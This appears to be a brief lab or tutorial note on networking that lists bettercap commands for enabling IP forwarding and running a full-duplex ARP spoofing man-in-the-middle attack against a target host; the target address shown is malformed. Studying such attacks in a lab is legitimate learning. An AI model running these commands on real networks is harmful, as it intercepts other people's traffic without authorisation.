## 1. Getting hands dirty with networking

```bash

 echo 1 > /proc/sys/net/ipv4/ip_forward
```
```bash

sudo bettercap -iface eth0
```
```bash

 set arp.spoof.fullduplex true
```

```bash

set arp.spoof.targets 172.30.144.159.24
```
```bash

arp.spoof on
```
![Alt text](image.png)